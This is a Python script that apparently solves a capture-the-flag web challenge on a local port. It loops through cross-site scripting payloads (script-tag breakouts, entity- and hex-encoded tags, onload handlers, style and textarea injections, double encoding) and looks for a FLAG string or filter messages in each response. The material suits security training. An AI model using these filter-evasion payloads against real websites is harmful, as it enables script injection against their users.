import requests
import re

target = "http://127.0.0.1:32889/page"

# Try different encoding combinations and contexts
payloads = [
    # Try without closing the input tag properly
    ('Break out of input', '"><script>alert(1)</script>'),
    ('Break with entities', '">&lt;&#115;&#99;&#114;&#105;&#112;&#116;&gt;alert(1)&lt;/&#115;&#99;&#114;&#105;&#112;&#116;&gt;'),
    ('Break with hex entities', '">&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;>alert(1)&#x3c;/&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;>'),
    
    # Try event handlers in attribute context
    ('" onload="alert(1)', '" onload="alert(1)'),
    ('" &#111;&#110;&#108;&#111;&#97;&#100;="alert(1)', '" &#111;&#110;&#108;&#111;&#97;&#100;="alert(1)'),
    
    # Try style context
    ('"><style>*{color:red}</style>', '"><style>*{color:red}</style>'),
    ('&quot;&gt;&lt;style&gt;*{color:red}&lt;/style&gt;', '&quot;&gt;&lt;style&gt;*{color:red}&lt;/style&gt;'),
    
    # Try textarea break
    ('"></input><textarea>', '"></input><textarea>'),
    
    # Try double encoding
    ('&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;', '&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;'),
]

print("Testing different injection contexts...")
print("="*80)

for name, payload in payloads:
    try:
        response = requests.get(target, params={'name': payload}, timeout=5)
        
        print(f"\n[{name}]")
        print(f"Payload: {payload[:60]}...")
        print(f"Status: {response.status_code} | Length: {len(response.content)} bytes")
        
        # Check for flags
        flags = re.findall(r'FLAG\{[^}]+\}', response.text)
        if flags:
            print(f"*** FLAG FOUND: {flags[0]} ***")
            print(f"Full response:\n{response.text}")
        elif "Failed! Try again!" in response.text:
            print("→ 'Failed! Try again!'")
        elif "Sorry, you can't use that tag" in response.text:
            print("✗ Blocked")
        else:
            print("? Different response")
            
    except Exception as e:
        print(f"ERROR: {str(e)}")

print("\n" + "="*80)

